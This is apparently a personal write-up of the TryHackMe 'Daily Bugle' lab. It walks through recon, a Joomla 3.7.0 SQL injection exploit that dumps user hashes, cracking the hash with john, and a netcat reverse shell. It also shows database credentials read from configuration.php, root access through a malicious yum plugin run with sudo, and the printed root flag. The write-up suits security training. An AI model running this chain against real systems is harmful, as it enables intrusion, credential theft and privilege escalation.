---
title: "Daily Bugle"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - linux
  - web
  - challenege
status: "Done"
difficulty: "Hard"
url: "https://tryhackme.com/room/dailybugle"
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: 190759b9275183b3a7fb8179ac227916
---

# Daily Bugle

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

### Nmap Scan

```json
╰─ nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.136.172                                                                                                                 ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-13 09:31 IST
Nmap scan report for 10.48.136.172
Host is up (0.013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds
```

### Fuzzing Dirs

```json
╰─ ffuf -u "http://10.48.136.172/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r                                                                                 ─╯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.136.172/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 11ms]
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 843ms]
administrator           [Status: 200, Size: 4846, Words: 227, Lines: 110, Duration: 715ms]
bin                     [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 9ms]
cache                   [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 10ms]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 9ms]
cli                     [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 9ms]
components              [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 10ms]
images                  [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 11ms]
includes                [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 10ms]
language                [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 8ms]
layouts                 [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 9ms]
libraries               [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 14ms]
media                   [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 116ms]
modules                 [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 10ms]
plugins                 [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 10ms]
robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 11ms]
templates               [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 10ms]
tmp                     [Status: 200, Size: 31, Words: 2, Lines: 2, Duration: 8ms]
:: Progress: [20481/20481] :: Job [1/1] :: 3703 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

### Using CMSeek for CMS detection

```json
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA

 [+]  Deep Scan Results  [+]

[✔] Target: http://10.48.136.172
[✔] Detected CMS: Joomla
[✔] CMS URL: https://joomla.org
[✔] Joomla Version: 3.7.0
[✔] Readme file: http://10.48.136.172/README.txt
[✔] Admin URL: http://10.48.136.172administrator

[✔] Open directories: 4
[*] Open directory url:
   [>] http://10.48.136.172administrator/modules
   [>] http://10.48.136.172administrator/components
   [>] http://10.48.136.172administrator/templates
   [>] http://10.48.136.172images/banners

[x] Core vulnerability database not found!

 CMSeeK says ~ zaijian
```

### Exploiting the CVE

```json
╭─░▒▓    ~/test/CVE-2017-8917-Joomla  on   master ?2 ▓▒░····················································································░▒▓ ✔  ghauri   at 09:47:05 AM  ▓▒░─╮
╰─ python3 main.py --host 10.48.136.172 --schema http --port 80                                                                                                                          ─╯
/home/kali/test/CVE-2017-8917-Joomla/main.py:39: SyntaxWarning: invalid escape sequence '\ '
  )\  (   (  (      ( /(( /(( /(  ( /(   )\ (  ( /(( /(  ( /(    (              )   )\   )
/home/kali/Tools/ghauri/venv/lib/python3.13/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

   (                    )   )   )     )   (        )   )     )                       (
   )\  (   (  (      ( /(( /(( /(  ( /(   )\ (  ( /(( /(  ( /(    (              )   )\   )
 (((_) )\  )\ )\ ___ )(_))\())\()) )\())_((_))\ )\())\()) )\())__ )\  (    (    (   ((_| /(
 )\___((_)((_|(_)___((_)((_)((_)\ ((_)\___|_((_|(_)((_)\ ((_)\___((_) )\   )\   )\  '_ )(_))
((/ __\ \ / /| __|  |_  )  (_) (_)__  /   ( _ )/ _(_) (_)__  /  _ | |((_) ((_)_((_))| ((_)_
 | (__ \ V / | _|    / / () || |   / /    / _ \_, /| |   / /  | || / _ \/ _ \ '  \() / _` |
  \___| \_/  |___|  /___\__/ |_|  /_/     \___/ /_/ |_|  /_/    \__/\___/\___/_|_|_||_\__,_|

>> Target : http://10.48.136.172:80/index.php
>> CSRF token : 16ecc5be3c58b8d444550feb5f972788
>> http://10.48.136.172:80/index.php is vulnerable to SQLI
>> Database version detected : 5.5.64-MariaDB
>> Current database : joomla
>> Show tables in database joomla
>> ----------------------------------------------------------------
>> |                           table_name                         |
>> ----------------------------------------------------------------
>> |                           #__assets                          |
>> |                        #__associations                       |
>> |                       #__banner_clients                      |
>> |                        #__banner_tracks                      |
>> |                           #__banners                         |
>> |                         #__categories                        |
>> |                       #__contact_details                     |
>> |                           #__content                         |
>> |                      #__content_frontpage                    |
>> |                       #__content_rating                      |
>> |                        #__content_types                      |
>> |                     #__contentitem_tag_map                   |
>> |                      #__core_log_searches                    |
>> |                         #__extensions                        |
>> |                           #__fields                          |
>> |                      #__fields_categories                    |
>> |                        #__fields_groups                      |
>> |                        #__fields_values                      |
>> |                       #__finder_filters                      |
>> |                        #__finder_links                       |
>> |                     #__finder_links_terms0                   |
>> |                     #__finder_links_terms1                   |
>> |                     #__finder_links_terms2                   |
>> |                     #__finder_links_terms3                   |
>> |                     #__finder_links_terms4                   |
>> |                     #__finder_links_terms5                   |
>> |                     #__finder_links_terms6                   |
>> |                     #__finder_links_terms7                   |
>> |                     #__finder_links_terms8                   |
>> |                     #__finder_links_terms9                   |
>> |                     #__finder_links_termsa                   |
>> |                     #__finder_links_termsb                   |
>> |                     #__finder_links_termsc                   |
>> |                     #__finder_links_termsd                   |
>> |                     #__finder_links_termse                   |
>> |                     #__finder_links_termsf                   |
>> |                       #__finder_taxonomy                     |
>> |                     #__finder_taxonomy_map                   |
>> |                        #__finder_terms                       |
>> |                     #__finder_terms_common                   |
>> |                        #__finder_tokens                      |
>> |                   #__finder_tokens_aggregate                 |
>> |                        #__finder_types                       |
>> |                          #__languages                        |
>> |                            #__menu                           |
>> |                         #__menu_types                        |
>> |                          #__messages                         |
>> |                        #__messages_cfg                       |
>> |                           #__modules                         |
>> |                        #__modules_menu                       |
>> |                          #__newsfeeds                        |
>> |                          #__overrider                        |
>> |                    #__postinstall_messages                   |
>> |                       #__redirect_links                      |
>> |                           #__schemas                         |
>> |                           #__session                         |
>> |                            #__tags                           |
>> |                       #__template_styles                     |
>> |                          #__ucm_base                         |
>> |                         #__ucm_content                       |
>> |                         #__ucm_history                       |
>> |                        #__update_sites                       |
>> |                   #__update_sites_extensions                 |
>> |                           #__updates                         |
>> |                          #__user_keys                        |
>> |                         #__user_notes                        |
>> |                        #__user_profiles                      |
>> |                     #__user_usergroup_map                    |
>> |                         #__usergroups                        |
>> |                            #__users                          |
>> |                       #__utf8_conversion                     |
>> |                         #__viewlevels                        |
>> ----------------------------------------------------------------
>>
>>
>> Describe table users
>> ----------------------------------------------------------------
>> |                          column_name                         |
>> ----------------------------------------------------------------
>> |                               id                             |
>> |                              name                            |
>> |                            username                          |
>> |                             email                            |
>> |                            password                          |
>> |                             block                            |
>> |                           sendEmail                          |
>> |                          registerDate                        |
>> |                         lastvisitDate                        |
>> |                           activation                         |
>> |                             params                           |
>> |                         lastResetTime                        |
>> |                           resetCount                         |
>> |                             otpKey                           |
>> |                              otep                            |
>> |                          requireReset                        |
>> ----------------------------------------------------------------
>>
>>
>> SELECT (id, name, username, email, password, block, sendEmail, registerDate, lastvisitDate, activation, params, lastResetTime, resetCount, otpKey, otep, requireReset) FROM #__users
>> --------------------------------------------------------------------------------------------------------------------------------
>> id, name, username, email, password, block, sendEmail, registerDate, lastvisitDate, activation, params, lastResetTime, resetCount, otpKey, otep, requireReset
>> --------------------------------------------------------------------------------------------------------------------------------
>> 811 ||| Super User ||| jonah ||| jonah@tryhackme.com ||| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm ||| 0 ||| 1 ||| 2019-12-14 20:43:49 ||| 2019-12-15 23:58:06 ||| 0 |||  ||| 0000-00-00 00:00:00 ||| 0 |||  |||  ||| 0
```

### Cracking the hash

```json
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:04:19 DONE (2026-03-13 10:08) 0.003856g/s 180.7p/s 180.7c/s 180.7C/s thelma1..setsuna
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Logging with cracked password

![[attachments/TryHackMe Rooms/TryHackMe/Daily Bugle/image.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Daily Bugle/image 1.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Daily Bugle/image 2.png]]

![[attachments/TryHackMe Rooms/TryHackMe/Daily Bugle/image 3.png]]

### Obtaining the reverse shell

```json
╰─ nc -lvnp 4444                                                                                                                                                                         ─╯
listening on [any] 4444 ...
connect to [192.168.158.240] from (UNKNOWN) [10.48.136.172] 37902
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:15:33 up  1:14,  0 users,  load average: 0.00, 0.01, 0.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
```

```json
bash-4.2$ cat /var/www/html/configuration.php
cat /var/www/html/configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
        
     }
     
bash-4.2$ ls /home
ls /home
jjameson
```

### Login as jjameson using ssh & get user flag

## Root Flag

---

## 1️⃣ Create a temporary directory

```bash
mkdir /tmp/yumroot
```

---

## 2️⃣ Move into the directory

```bash
cd /tmp/yumroot
```

---

## 3️⃣ Create custom yum config

```bash
cat > x << EOF
[main]
plugins=1
pluginpath=/tmp/yumroot
pluginconfpath=/tmp/yumroot
EOF
```

---

## 4️⃣ Create plugin configuration

```bash
cat > y.conf << EOF
[main]
enabled=1
EOF
```

---

## 5️⃣ Create malicious yum plugin

```bash
cat > y.py << EOF
import os
from yum.plugins import TYPE_INTERACTIVE

requires_api_version='2.1'
plugin_type=(TYPE_INTERACTIVE,)

def init_hook(conduit):
    os.system('/bin/bash')
EOF
```

---

## 6️⃣ Execute yum with the malicious plugin

```bash
sudo yum -c /tmp/yumroot/x --enableplugin=y --disablerepo=* list
```

---

```json
[root@dailybugle yumroot]# cd /root
[root@dailybugle ~]# ls
anaconda-ks.cfg  root.txt
[root@dailybugle ~]# cat root.txt
eec3d53292b1821868266858d7fa6f79
```
